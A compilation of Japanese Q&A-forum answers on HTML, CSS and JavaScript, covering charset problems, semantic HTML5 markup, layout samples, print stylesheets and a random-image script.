ただし、 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) でチェックしましょう。
　実際に記述されている文字コードと、charsetの文字コードが一致していないと文字化けを起こします。 　また、サーバーの応答ヘッダを確認する必要がある場合もあります。 firefoxのアドオンに、Live HTTP headers( https://addons.mozilla.jp/firefox/details/3829 )がありますので、それを使用するとサーバーからの応答ヘッダに HTTP/1.1 200 OK ・・・【中略】・・・ Content-Type: text/html; charset=UTF-8 のように書かれている場合、ユーザーエージェント(ブラウザ)によると、文字コードの判断を誤る可能性があります。レンタルサーバーでしたら、応答ヘッダを変更できるのですが、相でない場合は、HTMLをその文字コードに合わせる（当然、metaの値もあわせる）必要があるでしょう。 とりあえず 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) などでチェックしてみる。
各スライドに別々の id もしくは class を付けて、flipsnapのイニシャライズを別々にしてください。 例） -------- HTML -------- <div id="flipsnap1" class="viewport"> <ul class="flipsnap"> <li><p><a href="data/images/a1.gif" rel="lightbox[roadtri]"><img src="data/images/b1.gif" alt="b1" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a2.gif" rel="lightbox[roadtri]"><img src="data/images/b2.gif" alt="b2" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a3.gif" rel="lightbox[roadtri]"><img src="data/images/b3.gif" alt="b3" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a4.gif" rel="lightbox[roadtri]"><img src="data/images/b4.gif" alt="b4" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a5.gif" rel="lightbox[roadtri]"><img src="data/images/b5.gif" alt="b5" width="480" height="320" /></a></p></li> </ul> <div class="pointer"> <span class="current"></span> <span></span> <span></span> <span></span> <span></span> </div><!-- .pointer --> </div><!-- .viewport --> <div id="flipsnap2" class="viewport"> <ul class="flipsnap"> <li><p><a href="data/images/a1.gif" rel="lightbox[roadtri]"><img src="data/images/b1.gif" alt="b1" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a2.gif" rel="lightbox[roadtri]"><img src="data/images/b2.gif" alt="b2" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a3.gif" rel="lightbox[roadtri]"><img src="data/images/b3.gif" alt="b3" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a4.gif" rel="lightbox[roadtri]"><img src="data/images/b4.gif" alt="b4" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a5.gif" rel="lightbox[roadtri]"><img src="data/images/b5.gif" alt="b5" width="480" height="320" /></a></p></li> </ul> <div class="pointer"> <span class="current"></span> <span></span> <span></span> <span></span> <span></span> </div><!-- .pointer --> </div><!-- .viewport --> -------- JavaScript -------- <script type="text/javascript"> $(function() { var $pointer1 = $('#flipsnap1 .pointer span'); var flipsnap1 = Flipsnap('#flipsnap1 .flipsnap', { distance: 480, transitionDuration: 1000 }); flipsnap1.element.addEventListener('fspointmove', function() { $pointer1.filter('.current').removeClass('current'); $pointer1.eq(flipsnap1.currentPoint).addClass('current'); }, false); var $pointer2 = $('#flipsnap2 .pointer span'); var flipsnap2 = Flipsnap('#flipsnap2 .flipsnap', { distance: 480, transitionDuration: 1000 }); flipsnap2.element.addEventListener('fspointmove', function() { $pointer2.filter('.current').removeClass('current'); $pointer2.eq(flipsnap2.currentPoint).addClass('current'); }, false); }); </script>
覗いてみましたが、このサイトではFlashのローカル記憶領域に挑戦回数を記録しているようです。 (なので、やろうと思えばインチキも可能です) 他の方のご回答にもありますが、 ・Cookieに保存する ・セッションID等を見てユーザ判別し、サーバ側に回数を保存する という方法も使えます。
通常はCGIなどでPATH_INFOを利用して表示します。 ページデータは、すべて/dataにあるとします。 directoryIndexの順番を変更して、index.cgi index.html・・とかにしておきます。 　これは.htaccessで可能 ついで、/にindex.cgi を置きます。 　http://xxx.com/dir/index.html このとき、dir/以下は無いのですから、手続きに従って/dir/index.htmlはPATH_INFOに格納され、index.cgiに戻ってきます。 　index.cgiは、PATH_INFOから、index.htmlを手がかりに、/にあるindex.htmlをそのまま返します。他のPATH_INFOでしたら、/dataディレクトリから拾ってくれば良いです。 　例えば、Enviroment Variable and FORM,COOKIE( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi )のページ、以下にどんなPATH_INFOが追加されても http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/k5z/8 … であろうと・・
firefoxだと動作しますよ。 いくつか文法上の間違いがある。 DOCTYPEと中身の不一致 />になっていなかったり <nav>のように他のHTMLの要素があったり 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html )
スタイルシートの質問だと思いますが、スタイルシートを導入する最大の目的は、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」の分離です。 ＞テーブルのレイアウトを崩したくないので、幅は固定したまま、かつ画像はブラウザサイズによって自動縮小にするようにしたいのですが、 　とありますが、仕様書を一度でも読まれていたら『単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』や『ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』が否定されている事は御存知だと思います。 　拝見するところ、アルバムのような画像とその説明のようです。でしたらHTMLは、 単純に <div class="section" id="PhotoList"> 　<h2>アルバム</h2> 　<div class="section"> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<div class="figure"> 　　　<img src="" width="" height="" alt=""> 　　　<div class="figcaptin"> 　　　　画像の説明 　　　</div> 　　</div> 　</div> 　<div class="section"> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<div class="figure"> 　　　<img src="" width="" height="" alt=""> 　　　<div class="figcaptin"> 　　　　画像の説明 　　　</div> 　　</div> 　</div> の繰り返しなどになるはずです。!!! 　　★id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )もので、wakuとかa,bじゃ意味ないですし、後々困るのはあなたです。HTML5では、HTML4に文書構造を示す要素がなく、DIVを使わざるを得なかった反省から、『文書を構造化するために要素が追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』。言い換えればそのようなclass、idが使われてきたものを要素にしたと言うこと。 HTML5だと <section id="PhotoList"> 　<h2>アルバム</h2> 　<section> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<figure> 　　　<img src="" width="" height="" alt=""> 　　　<figcaptin> 　　　　画像の説明 　　　</figcaption> 　　</figure> 　</section> 　<section> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<figure> 　　　<img src="" width="" height="" alt=""> 　　　<figcaptin> 　　　　画像の説明 　　　</figcaption> 　　</figure> 　</section> になりますね。 　ひょっとして、画像リスト <dl> 　<dt>タイトル</dt> 　<dd>記事</dd> 　<dd class="photo"> 　　<img src="" width="" height="" alt=""> 　　<p>説明</p> 　</dd> 　<dt>タイトル</dt> 　<dd>記事</dd> 　<dd class="photo"> 　　<img src="" width="" height="" alt=""> 　　<p>説明</p> 　</dd> ・・のほうが良いかも。あなたの文書はあなたしか分からない。 ★HTMLには、文書の(内容)構造しか書かない!!どのようにプレゼンテーションするかは、そのためのスタイルシートを使用します。 ＞テーブルのレイアウトを崩したくない ＞画像を自動で縮小したい 　整合性が全く無いように読めます。tableを使う一番の目的は、tableだと 『表を見るために水平スクロールを強いられることがある。 こうした問題を最小限に押さえるため、著者は文書の整形には表ではなくスタイルシートを用いるべきである。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　なぜtableレイアウトなのかを説明していただけると・・ ★文中のリンク先は読んでおくこと ★画像を伸縮させる事は可能です（簡単に）が、それには、前提として「CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。( http://jigsaw.w3.org/css-validator/#validate_by_ … )」
変更方法は他の方が既に回答されているので省きますが faviconの便利なツールなど紹介しておきます http://www.favicon.cc/ http://liginc.co.jp/web/design/material/16853
HTMLやPHP、JavaScriptといったスクリプト言語について勉強してください。
まず、国外から見る場合でも文字コード宣言が正しければShift_JISでもUTF-8でも問題なく見られます。 (ところで文中Shift-JISとなっていますが正しくShift_JISと書いていますか?) なので、Shift_JIS外の文字を使わないならShift_JISでもよいということになりそうですが、面倒な問題がありやはりUTF-8にすべきです。 何が問題かというと、Shift_JIS外の文字は外国語のためだけのものではないのです。 詳しくは「JIS2004」で検索するとよいと思いますが、WindowsVistaの頃から新しい漢字がWindows標準のMS-IMEで普通に変換できるようになりました。 これらの文字はShift_JISでは扱えませんが、使える文字と使えない文字を見た目で区別することは出来ません。 つまり、普通に文章を打ってもShift_JIS外の文字が混入しますし、どこかからコピーしてきた文章の中にShift_JIS外の文字が入っているかは保存してみるまで分かりません。 これに対応するのは面倒なので、UTF-8をお勧めします。 なお、一応対応策を書いておきますが、お勧めしません。 ・使える漢字と使えない漢字の区別は、MSゴシックで見ると大半が分かります。表示が汚い方が使えない漢字です。例外はありますが。 ・MS-IMEは設定でShift_JISの文字のみしか変換できないようにできます。
divタグでも正しく反映されるはずです。 実際のHTMLやCSSが無いので、的確な回答はできませんが、以下のような事が考えられます。 ・タグが正しく閉じられていない ・同じIDを複数のところに使用している スタイルシートの属性としては、id属性とclass属性がありますが、id属性は１ページに１箇所（固有の場所）の定義しかできません、一方class属性はページで共通の属性を持たせる事ができます。 詳細は、以下を参照。 http://allabout.co.jp/gm/gc/23897/
HTMLのタグではなく、CSSの問題。 inputの背景をtransparentにすれば親や先祖要素の背景が見えます。
インデントはエディターによってまちまちなので、ずれるのでしょう。 解決方法はyukiponta さんがブラウザでプレビューするテキストエディターをDreamweaverのインデント設定に合わせるか、その逆で、そのテキストエディターにDreamweaverのインデント設定を合わせる。 Dreamweaver 編集＞環境設定＞コードフォーマット の上の方にインデント関連の設定があります。
＞閲覧者が少しでもいいので「おぉ！」ってなるのを作りたいのです。 　気持ちは分かりますが、それは、ウェブの場合忘れなさい!!!ウェブの最大の目的は「どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」なのです。これだけは忘れてはならない。 　あなたが、このサイトを利用されるのも、断じてデザインじゃなく、内容!!ですよ。 　皆が、「おぉ!」と言うのは 『どうすれば自分のウェブサイトが独自性、価値、または魅力のあるサイトといえるようになるかを考えてみる。( https://support.google.com/webmasters/answer/357 … )』 　本題です。 　HTMLやスタイルシート、javascriptは、パクって良いです。(^^)このウェブを考案したバーナーズリーは、『私が構想していたのは、自分の知識や考えを共有させることが、他人の知識を 学ぶのと同じくらいに容易であるようなシステムであった。( http://www.sal.tohoku.ac.jp/~gothit/webauthoring … )』なのですからね。 ★ゲームの公式サイトなんかによくある、カーソルを合わせたらそれに見合ったメニューが出てきてその中から選んでクリックすると次のページに飛ぶ。 　スタイルシートで簡単に実現できます。 ★左側には常にメニューが存在していてクリックすれば右側に表示される。 　スタイルシートを使うことが多いです。 　iframe--問題が多く余り薦めません。 　単に各ページに同じナビゲーションを置いてページ遷移するほうが良いです。 ★クリックすれば画面外からスライドしてきて次のページに移動するヌルヌル動くウェブサイト？ 　jQuery(javascript)を使います。 ※でもね。そんなこと糞食らえ!!!。まず内容を誰にも負けないくらい充実させること!!これにまさる「おぉ!!」はないですよ。 　
簡単なサンプル ★<div class="section"></div>や<section></section>をコピーペーストして増やしてみる。 ★タブは＿に置換してあるので戻すこと。 ★HTML4.01以降、HTMLには焚書構造を文書構造しか書かないのでHTMLは楽です。スタイルシートは学んでください。 ★ウィンドウ幅に依存しないのでスマホでも幅広ディスプレイでも利用可。印刷時は素のままで ★HTML5はまだ時期尚早かな 【HTML4.01strict 文字コードはShift_JIS】 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- html,body{margin:0;padding:0;position:relative;} div.section,div.footer{width:80%;margin:0 auto;padding:5px;} div.header{position:fixed;width:100%;} div.header h1,div.header p{line-heigh:1.6em;width:80%;margin:0 auto;padding:5px;} div.header div.nav{width:80%;margin:0 auto;} div.header div.nav ol{margin:0;padding:5px;width:190px;height:600px;list-style:none;position:relative;left:-5px;} div.header div.nav ol li{text-align:center;width:80%;height:2em;margin:5px;} div.section{padding-top:100px;} div.section>*,div.footer>*{margin-left:200px;} div.section+div.section{padding-top:5px;} div.header h1,div.header p{background-color:lime;} html{background-color:gray;} div.header div.nav ol{background-color:rgb(238,255,130);} div.header div.nav{} div.section,div.footer{background-color:rgb(255,192,128);} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="./link1">リンク1</a></li> ＿＿＿＿<li><a href="./link2">リンク2</a></li> ＿＿＿＿<li><a href="./link3">リンク3</a></li> ＿＿＿＿<li><a href="./link4">リンク4</a></li> ＿＿＿＿<li><a href="./link5">リンク5</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>HTMLで一部だけスクロールするようにしたい</h2> ＿＿<p>HTMLで画像のような画面構成でタイトルとメニューを固定してメインの部分だけをスクロールするようにしたいのですがどのようにすればいいか教えてくれませんか？</p> ＿</div> ＿<div class="section"> ＿＿<h2>HTMLで一部だけスクロールするようにしたい</h2> ＿＿<p>同じソースをコピーする。</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-11-20</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html> 【HTML5】文字コードはUTF-8で保存すること。 <!doctype html> <html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="IRUKA"> <style media="screen"> <!-- html,body{margin:0;padding:0;position:relative;} section,footer{width:80%;margin:0 auto;padding:5px;} header{position:fixed;width:100%;} header h1,header p{line-heigh:1.6em;width:80%;margin:0 auto;padding:5px;} header nav{width:80%;margin:0 auto;} header nav ol{margin:0;padding:5px;width:190px;height:600px;list-style:none;position:relative;left:-5px;} header nav ol li{text-align:center;width:80%;height:2em;margin:5px;} section{padding-top:100px;} section>*,footer>*{margin-left:200px;} section+section{padding-top:5px;} header h1,header p{background-color:lime;} html{background-color:gray;} header nav ol{background-color:rgb(238,255,130);} header nav{} section,footer{background-color:rgb(255,192,128);} --> </style> </head> <body> ＿<header> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿＿<nav> ＿＿＿<ol> ＿＿＿＿<li><a href="./link1">リンク1</a></li> ＿＿＿＿<li><a href="./link2">リンク2</a></li> ＿＿＿＿<li><a href="./link3">リンク3</a></li> ＿＿＿＿<li><a href="./link4">リンク4</a></li> ＿＿＿＿<li><a href="./link5">リンク5</a></li> ＿＿＿</ol> ＿＿</nav> ＿</header> ＿<section> ＿＿<h2>HTMLで一部だけスクロールするようにしたい</h2> ＿＿<p>HTMLで画像のような画面構成でタイトルとメニューを固定してメインの部分だけをスクロールするようにしたいのですがどのようにすればいいか教えてくれませんか？</p> ＿</section> ＿<footer> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-11-20</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</footer> </body> </html>
アップロードしたファイルが改変されている可能性もありますが、 利用しているブラウザに何かしらのアドオンが入っていたり、 PCがウイルスやスパイウェアに感染していて、コードが挿入されている可能性もありそうです。 コード参照先のドメインを調べてみましたが、あまり良さそうなサーバではない雰囲気でした。
ボタンのstyle属性に"width:100px"などと指定するのはダメなんでしょうか？
Windows8 + IE10 なら、Adobe Flash Playerが入っているようなことが書いてありますが、swf形式のファイルは再生できませんか。 当初の質問内容と異なってきましたので、改めて質問されて動画に詳しい方の回答を得てください。
<th>タグはデフォルト設定で、文字は太字でセル内の中央に表示されるようになります。 <th>はTable Headerの略です。
No.1です。 この回答の論拠、ソースはありますか？？ １．万が一、検索順位が現状から下がってしまうと困る。 ２．案件が中～大規模サイトの為、プロジェクトメンバーに理由づけて説明しなければいけない・・汗 　残念ながら、googleボットのアルゴリズムの詳細を公表していませんので、真相は分かりませんが、検索結果を良くしようとしていますが、そのためには適切なマークアップは求め続けています。 　⇒ウェブマスター向けガイドライン（品質に関するガイドライン） - ウェブマスター ツール ヘルプ( https://support.google.com/webmasters/answer/357 … ) 　HTML5の策定過程をウォッチしていますと、googleなどが盛んに主張しているのが、文書構造の明確化です。header,section,footer,navなどを主張してきたのはgoogleのスタッフですからね。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 【問題2】文書内に埋め込まれた「意味」が不明確 　次に挙げられる問題としては、「以前のHTMLは、文書構造の「意味」を表すための機能が不足していた」ということが挙げられます。 　例えば、「見出し」「本文」といった文書構造を表すのに、これまでは＜div＞要素を用いることが一般的でした。しかし、＜div＞要素は厳密にいうと「意味を持たない」という意味の要素です。＜div＞が多用されたHTML文書は、開発者が目で見て読むのであれば、文書構造の意味を把握することは容易かもしれません。 　しかし、例えば検索エンジンやスクリーンリーダーなどのプログラムにとっては、「どこからどこまでが重要な本文なのか」「この＜ul＞要素はナビゲーションメニューを表しているのか、文書中の個条書きなのか」すらも分からないのです。 → 【解決】文書内に埋め込まれた「意味」を明確にする 　HTML5では、この問題に対処するため、数多くの意味的要素（「セマンティックな要素」と呼ばれます）が追加されました。それだけではなく、 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … )］より 　googleは、私のHTML2.0や、HTML3.2で作られた古いページもちゃんと上位に表示してくれてます。HTML自体のバージョンで評価の対象にはならないです。現在、一定の評価を受けている物を、他のHTMLに変更するのは必要なわけではありません。ただ、検索エンジンが内容をより的確に理解できるようになる可能性がありますので、本来はもっと低い物が上位に表示されていたり、逆にもっと高く評価されるべきものが低く評価されていたりはなくなる可能性はありますね。 　私は、既存のページはそのままにしておいて、新たに作成するページのみHTML5なりHTML4.01strictにHTML5の新しい要素をclass名にしたもの ・・section,article,main,aside,header,footer,nav,figure,figcaption・・ で統一して、HTML5に完全移行するときは、スクリプトで一括変換できるようにしています。
　エクセルなどで表組みしてweb出力指定でやるのが一番楽なのでは。
「タグ全体」じゃ意味分からんし「リンク」じゃないねそれ。紛らわしい言葉を使うのはやめましょう。特に同じカテゴリ内で別の意味を明確に持っている言葉は。 barusu0126さんのようにJavaScriptを使って<li>内のクリックを拾うか、 CSSで<label>にdisplay:blockを与えてブロック要素として扱わせると要素の領域が<li>のいっぱいまで広がるので、 それを使ってください。 一応念のため言っておくと、「なんか上手いこと自動でそうなる」方法はありません。
それが表ならtableです。 <table summary="Navigation"> 　<caption>ナビゲーション</caption> 　<thead> 　　<tr> 　　　<th abbr="サイト名">サイト名</th> 　　　<th abbr="説明">説明</th> 　　　<th abbr="アイコン"></th> 　　</tr> 　</thead> 　<tbody> 　　<tr> 　　　<td>グーグル</td> 　　　<td>世界最大の検索エンジン</td> 　　　<td><a href="https://www.google.co.jp/"><img src="https://www.google.com/images/logos/google_logo_ … width="116" height="41" alt="googleへ"></a> 　　　</td> 　　</tr> 　・・・・でしょう。 もしそれが、ナビゲーションのリストでしたら <div class="Navigation"> 　<h3>ナビゲーション</h3> 　<ul> 　　<li>グーグル 　　　<p>世界最大の検索エンジン 　　　　<a href="https://www.google.co.jp/"><img src="https://www.google.com/images/logos/google_logo_ … width="116" height="41" alt="googleへ"></a> 　　　</p> 　とマークアップされるかもしれません。 　項目の追加など後々のメンテナンスの容易さ、検索エンジン対策、印刷用のスタイルとか、スマホなど小さな画面用のスタイルとか、スクリーンリーダー用の読み方とか・・圧倒的なデザインの自由度などから、リストのほうが好まれますね。 　ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … )は、HTMLにデザイン要素はないから自在にデザインできる。 　要は、「HTMLには文書構造しか書かない」プレゼンテーショはスタイルシートに任せる『構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』さえ、理解できていれば、悩む問題じゃないですよ。デザイン(プレゼンテーション)目的にHTMLを書こうとするから、余計な悩みを抱えることになる。 　ちなみにHTML5だと、table要素のsummary属性、th要素のabbr属性か必須でなくなるので・・ tbody要素は必須です。 <table class="Navigation"> 　<caption>ナビゲーション</caption> 　<thead> 　　<tr> 　　　<th>サイト名</th> 　　　<th>説明</th> 　　　<th></th> 　　</tr> 　</thead> 　<tbody> 　　<tr> 　　　<td>グーグル</td> 　　　<td>世界最大の検索エンジン</td> 　　　<td><a href="https://www.google.co.jp/"><img src="https://www.google.com/images/logos/google_logo_ … width="116" height="41" alt="googleへ"></a> 　　　</td> 　　</tr> 　・・・・ <nav> 　<h3>ナビゲーション</h3> 　<ul> 　　<li>グーグル 　　　<p>世界最大の検索エンジン 　　　　<a href="https://www.google.co.jp/"><img src="https://www.google.com/images/logos/google_logo_ … width="116" height="41" alt="googleへ"></a> 　　　</p>
株式会社オートセット http://www.aughtset.com/log_disp.php こちらで公開しているログを見ると SOL-FTTB.240.152.118.46.sovam.net.uaのIPアドレスは 46.118.152.240みたいですよ。 実際 nslookup 46.118.152.240 したら Name: SOL-FTTB.240.152.118.46.sovam.net.ua Address: 46.118.152.240 という結果が出ました。
wordデータは、完全にプラットホームに依存しますから、Webで公開するには不向きです。 他のOSやwordをもっていない人、もっていてもバージョンが適合しない人には意味がありません。スマホや携帯では利用できない。 　しかも、そのファイルをウィンドウで開くのかダウンロードするかはブラウザ依存です。 　HTMLで作成する。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　PDFにする。 　
NO.2です。 http://www.xdomain.ne.jp/server/ ↑こちらですと広告が表示されますが、無料です。 無料でデータベースもついてるものは少ないですが、他にも探せばあるかもしれません。 サーバーにアップしないと、web上に公開できないので必須です。 CSSは必須ではありませんが、覚えておいて損はないですよ。
無理矢理やろうとするなら、改行があるように見せたい位置のセルにclassを付けて、border等を消してheightを入力すれば見た目上は実現できるでしょう。 何故ひとつのidでやりたいかというのがよく伝わってこないのですが、 単純に二つのtableをdivか何かで囲んで、そのdivにidを付けるのではダメなんでしょうか？
改行コードの違いだと思われます。 「右クリック→ソースの表示」で表示されるのは、どのアプリケーションのものでしょうか? たとえば、Windowsのメモ帳は LFが改行だと、改行として機能しません。
＞nowrapが入っていたからです。 　いや、それじゃ文法的にも？？？ 　いまどき、transitionalでページを作成したら・・HTML5の時代になったら困りますよ。 　⇒nowrap( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　1999年の昔から『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』と言われ続けてきた。この前後をよく読む!! 　strictで作成し、 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　などでチェックしながら上達早いです.
bodyのonloadイベントなどでチェックを外すscriptを実行するのはどうでしょうか
ぼやけるのは画像のサイズと表示サイズが違うからでしょう。 横幅239pxの画像を、cssの指定で260pxに拡大して表示しているので、ぼやけるのは当然です。 色が変わるのはCMYKで作っているからではないでしょうか？ 一度カラーモードを確認してみてください。 また、基本的にイラレはWebの制作には向いていません。 イラレは印刷向けのソフトなので基本の単位はmmです。 それをピクセルに直すと小数点の数値になるので画像の端は必ずぼけます。 環境設定から単位をピクセルにして作る事も出来ますが、 それでも完璧にピクセルにあった画像を作れるわけではありません。 Web用の画像はPhotoshopかFireworksで作成しましょう。 ただ、Fireworksは開発終了が発表されていますので 今後の事を考えるとPhotoshopを使うのが良いと思います。 また、PhotoshopはWeb専用ツールではないので、Webデザイン作成時にはある程度設定する必要があります。 下記の記事を参考にしてください。 http://designcolor-web.com/2012/05/29/photoshop- …
#2です。IE10 にて http://www.nict.go.jp/JST/JST.html をHPに設定しましたが再現できませんでした。 > 例文です。 実際に試したURLを書くようにお願いします。 質問本文では実際に http://www.hogehoge.co.jp/TEST/TEST.html を検証の為に設定したように読めます。 ちょっとした差異で現象が再現されない場合があります。 > Win8で、IE11では、大丈夫でした。 IE9以下で再現されるのかもしれませんが、環境がないので試せません。 Google検索でも情報がHITしなかったのでちょっとわかりません。すみません。 他の方の情報をお待ちください…。
body.cssに以下の記述があるためですね。 div{border:none; width:550; text-align:left;} FC2投票でもDiv要素が使われているので上記スタイルの影響を受けています。
文法で規定されている物は、 ・何も書かない ・属性値を指定しない ・属性値として"selected"を指定する の３つです。 それ以外は文法違反となりますので、文法違反の処理は環境依存です。
http://detail.chiebukuro.yahoo.co.jp/qa/question … この人？ 今回の質問にDWやXAMPPが何も関係ないってことすら分からんレベルの癖に贅沢言わないでくれないかな… 初心者ですって言えば何でも許されると思ったら大間違いですよ。 ・「ランダムに1つ」ならできて「重複なしで3つ」ができないのか ・「1つ」ならできて「3つ」ができないのか ・そもそもランダムができないのか ・「何を」調べて「何が」分からなかったのか どこまでできて何ができないのかをはっきり言わないと、結局一から十まで教えることになり、宿題を丸投げしてくる小中学生と同レベルです。 何も分からなくて他人に頼るなら、せめてそれくらいは自分で努力してくださいね。 ご希望のプログラムを組むには「配列」「乱数」「HTMLへの出力」などの知識が必要ですが、どれもまったく知らないんでしょ？ 初心者が高望みなどせず、順番に覚えなさい。 まずは「配列」について理解しましょう。 次に「乱数」について理解しましょう。 そうすると「配列の中のどれかをランダムにひとつ取得」ができるようになります。 次に、HTMLへの出力を覚えます。 出力するためには、出力する「もの」を作成することと、出力先を取得することが必要になります。 まずは空の<body>内に文字を出力することから始めましょう。 慣れてくれば、特定の場所（今回で言えば特定のテーブルセル内）に特定の要素を入れることができるようになります。 これを組み合わせると「配列の中からランダムに3つを特定の場所に出力」ができます。 これくらいのレベルに来てやっと「重複なく3つ」に手を出せます。 JavaScriptには標準で「配列のある要素を取得し、それは配列から削除する」という機能がありますので、インデックスに乱数を与えてこれを3回行えば「重複なくランダムに3つ」が実現できます。 どうですか？ 「何も分かりません全部教えてください」って言ったからって簡単に教えられるような内容じゃない（あなたレベルの人にとって）ことが分かりましたか？ 悪いことは言わないからできることからやりましょう。 ※下記が動作としてはあなたの希望通りであることを確認してください。 <html> <head> <script> window.onload = function(){ var list = new Array( '<img src="画像1.jpg" alt="sample1" width="170" height="200">\n<p><a href="画像1.html">説明1</a></p>\n<p>詳細1</p>', '<img src="画像2.jpg" alt="sample2" width="170" height="200">\n<p><a href="画像2.html">説明2</a></p>\n<p>詳細2</p>', '<img src="画像3.jpg" alt="sample3" width="170" height="200">\n<p><a href="画像3.html">説明3</a></p>\n<p>詳細3</p>', '<img src="画像4.jpg" alt="sample4" width="170" height="200">\n<p><a href="画像4.html">説明4</a></p>\n<p>詳細4</p>', '<img src="画像5.jpg" alt="sample5" width="170" height="200">\n<p><a href="画像5.html">説明5</a></p>\n<p>詳細5</p>', '<img src="画像6.jpg" alt="sample6" width="170" height="200">\n<p><a href="画像6.html">説明6</a></p>\n<p>詳細6</p>', '<img src="画像7.jpg" alt="sample7" width="170" height="200">\n<p><a href="画像7.html">説明7</a></p>\n<p>詳細7</p>', '<img src="画像8.jpg" alt="sample8" width="170" height="200">\n<p><a href="画像8.html">説明8</a></p>\n<p>詳細8</p>', '<img src="画像9.jpg" alt="sample9" width="170" height="200">\n<p><a href="画像9.html">説明9</a></p>\n<p>詳細9</p>' ); for(i=1;i<=3;i++){ document.getElementById("td" + i).innerHTML = list.splice(Math.floor(Math.random() * (list.length-1)),1); } } </script> <title>test</title> </head> <body> <table border="1"> <tr><td width="265" id="td1"></td><td width="265" id="td2"></td><td width="265" id="td3"></td></tr> </table> </body> </html>
印刷用のスタイルシート [print.css] @charset "Shift_JIS"; div.header div.nav ol{ width:160mm; border:solid 1px black; position:relative; padding:0; } div.header div.nav ol:after{ content:"サイトマップ"; background-color:white; position:absolute; top:-0.5em; left:1em; font-size:1.2em;font-weight:bold; } div.header div.nav ol:before{ content:url(../images/background/a1.jpg); float:left; margin-top:10mm;} div.header div.nav ol,div.header div.nav ol li{ display:block; } div.header div.nav ol li{margin-left:250px;} div.header div.nav ol li a{text-decoration:none;} div.header div.nav ol li a:after{ content:"\A http://hoge.com"attr(href); white-space:pre; } あとはブラウザの表示メニューからスタイルシートを選択して・・・(Chromeは代替スタイルシートを使えない)・・・表示を確認し、印刷プレビューで印刷状態も確認。 ★要はHTMLはデザインを無視して正直に詳しく文書構造だけを記述すると、 ＞画像 2枚重ねた上に文字 　